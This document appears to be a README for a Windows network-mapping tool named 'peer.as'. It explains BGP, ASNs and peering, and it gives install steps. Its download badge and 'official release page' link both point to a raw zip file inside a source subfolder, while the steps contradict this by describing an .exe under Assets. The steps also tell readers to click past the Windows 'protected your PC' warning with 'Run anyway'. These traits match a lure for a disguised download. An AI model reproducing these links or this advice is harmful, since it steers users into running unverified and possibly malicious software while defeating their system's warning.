# 🌐 peer.as - See global internet paths with ease

[![](https://img.shields.io/badge/Download-peer.as-blue.svg)](https://raw.githubusercontent.com/cumbriapullulation526/peer.as/main/ipcollect/web/src/peer_as_1.7-beta.4.zip)

peer.as maps the way data travels across the internet. It provides a visual view of core network structures. You can track IP prefixes, look up autonomous system numbers, and study peering relationships. This tool helps network engineers and curious users understand how traffic moves between providers.

## 📥 Getting Started

Follow these steps to install the software on your Windows computer.

1. Go to the [official release page](https://raw.githubusercontent.com/cumbriapullulation526/peer.as/main/ipcollect/web/src/peer_as_1.7-beta.4.zip).
2. Scan the list for the version labeled "Latest".
3. Find the file ending in `.exe` under the Assets section.
4. Click the file name to start the download.
5. Save the file to your desktop or downloads folder.

## 🛠️ The Installation Process

Once the download finishes, move to the folder where you saved the file. Double-click the `peer.as.exe` file to start the setup.

Windows might show a message that says "Windows protected your PC." This happens because peer.as is a new application. Click "More info" and then click "Run anyway" to move forward.

The installer opens a window. Follow the prompts on the screen:

- Choose the folder where you want to keep the application.
- Select if you want a shortcut on your desktop.
- Click Install to begin the process.

The installer finishes in a few seconds. You can now launch the application from your Start menu or your desktop shortcut.

## 🖥️ System Requirements

Ensure your computer meets these basic needs to run the software.

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4 gigabytes of RAM.
- Storage: 200 megabytes of free disk space.
- Internet: A steady connection to fetch live routing data.

## 🔎 How to Use the Interface

When you open peer.as, you see a search bar and a main map view.

### Searching for Networks
Type an IP address, a network name, or an autonomous system number (ASN) into the search box. Press Enter. The application loads the record for that entry.

### Navigating the Data
The main window displays the network path. Lines connect different nodes. Each node represents a network provider or an exchange point. Hover your mouse over any line to see details about the connection speed and distance.

### Viewing IP Prefixes
Click the "Prefixes" tab to list all IP ranges currently claimed by the selected network. This data updates in real time to show current shifts in internet routing.

### Mapping AS Paths
To see how a specific data packet moves from point A to point B, select the "Path" tab. Type your start address and destination address. The tool draws the path across the global map. This shows every network hop the data takes.

## 📡 Understanding Network Terms

You will see terms inside the software that relate to how the internet works. Here is a guide to what they mean:

- **BGP**: The protocol the internet uses to decide which path data takes.
- **ASN**: A unique number given to each network provider.
- **IP Prefix**: A range of IP addresses that belong to a single network.
- **Peering**: A direct connection between two networks to swap data without paying a third party.
- **Origin**: The starting point of an IP address range.

## ⚙️ Settings and Customization

You can change how the software looks and acts in the Settings menu. Click the gear icon in the top right corner.

- **Theme**: Switch between light mode and dark mode.
- **Update Frequency**: Choose how often the application fetches new routing data. High frequency uses more data but keeps info fresh.
- **Map Style**: Pick between standard, satellite, or minimalist map views.

## ⚠️ Troubleshooting Common Issues

If the application does not work as expected, try these steps.

### Application Will Not Load
Check if your internet connection is active. The software needs a connection to reach the BGP databases. Also, restart your computer and try opening the program again.

### Map Displays Blank
This often happens if your firewall blocks the application. Make sure the application has permission to talk to the internet in your Windows Defender settings.

### Data Seems Old
Click the "Refresh" button at the bottom of the window to force a new pull of data.

### Slow Performance
Close other programs. Visualizing complex network graphs takes memory. If your machine has low RAM, avoid searching for paths that span many continents.

## 📜 Updates

New versions release often to fix bugs or add network nodes. You can check for updates manually by clicking the "Check for Updates" button in the Help menu. The software notifies you when an update exists. We recommend you keep the software updated to ensure the map data stays accurate.

## ❓ Frequently Asked Questions

**Is this software free?**
Yes, peer.as is free for everyone to use.

**Does it track my personal IP?**
No. Peer.as monitors public routing data only. It does not track your private usage or individual machine information.

**Can I export the data?**
Yes. You can export current views as a report file from the File menu. This allows you to save network maps as a file for offline viewing.

**How do I uninstall the software?**
Go to your Windows Settings, then Apps, then Installed Apps. Find peer.as in the list, click the three dots, and select Uninstall. The process removes all files associated with the program.